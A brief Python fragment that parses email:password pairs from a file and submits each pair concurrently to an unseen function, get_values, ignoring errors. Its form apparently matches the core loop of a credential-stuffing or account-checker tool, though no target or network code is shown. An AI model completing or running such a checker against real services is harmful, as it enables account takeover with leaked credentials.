with open(file, "r", encoding="utf-8") as f:
 for line in f:
  try:
   if ':' in line:
    email = line.strip().split(':')[0]
    password = line.strip().split(':')[1]
    executor.submit(get_values,email,password)
   else:
        pass
  except Exception as e:
  	pass		